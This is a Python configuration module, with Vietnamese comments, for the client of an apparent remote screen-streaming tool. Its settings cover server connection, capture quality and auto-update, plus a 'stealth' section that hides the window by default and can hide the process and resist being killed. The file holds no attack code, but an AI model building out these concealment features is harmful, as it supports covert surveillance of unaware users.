"""
Cấu hình Client - Đọc từ file hoặc command line.
"""

import os
import sys
import json
from dataclasses import dataclass, field, asdict
from typing import Optional

import yaml


@dataclass
class ClientConfig:
    """Cấu hình Client máy con."""

    # Server connection
    server_host: str = "127.0.0.1"
    server_port: int = 8765
    use_ssl: bool = False

    # Capture settings
    fps: int = 60
    quality: int = 90
    max_width: int = 1920
    grayscale: bool = False
    use_delta: bool = True
    delta_block_size: int = 16
    use_gpu: bool = False

    # Network
    reconnect_interval: int = 3
    heartbeat_interval: int = 3
    max_message_size: int = 50 * 1024 * 1024

    # Stealth
    hide_window: bool = True
    hide_process: bool = False
    anti_kill: bool = False

    # Auto update
    auto_update: bool = True
    update_url: str = ""
    update_interval_hours: int = 24

    # Encryption
    use_encryption: bool = True
    auth_token: str = ""

    # Advanced
    enable_performance_monitoring: bool = True
    log_level: str = "INFO"
    log_file: str = "data/logs/client.log"
    cache_dir: str = "data/cache"

    @classmethod
    def from_file(cls, path: str) -> 'ClientConfig':
        """Đọc cấu hình từ file."""
        if not os.path.exists(path):
            return cls()

        with open(path, 'r') as f:
            data = yaml.safe_load(f) or {}

        config = cls()

        # Server
        if 'server' in data:
            srv = data['server']
            config.server_host = srv.get('host', config.server_host)
            config.server_port = srv.get('port', config.server_port)
            config.use_ssl = srv.get('ssl', config.use_ssl)

        # Capture
        if 'capture' in data:
            cap = data['capture']
            config.fps = cap.get('fps', config.fps)
            config.quality = cap.get('quality', config.quality)
            config.max_width = cap.get('max_width', config.max_width)
            config.use_delta = cap.get('use_delta', config.use_delta)

        # Stealth
        if 'stealth' in data:
            st = data['stealth']
            config.hide_window = st.get('hide_window', config.hide_window)
            config.hide_process = st.get('hide_process', config.hide_process)
            config.anti_kill = st.get('anti_kill', config.anti_kill)

        return config

    @classmethod
    def from_args(cls) -> 'ClientConfig':
        """Đọc cấu hình từ command line arguments."""
        config = cls()

        if len(sys.argv) > 1:
            config.server_host = sys.argv[1]
        if len(sys.argv) > 2:
            config.server_port = int(sys.argv[2])
        if len(sys.argv) > 3:
            config.auth_token = sys.argv[3]

        return config

    def to_dict(self) -> dict:
        return asdict(self)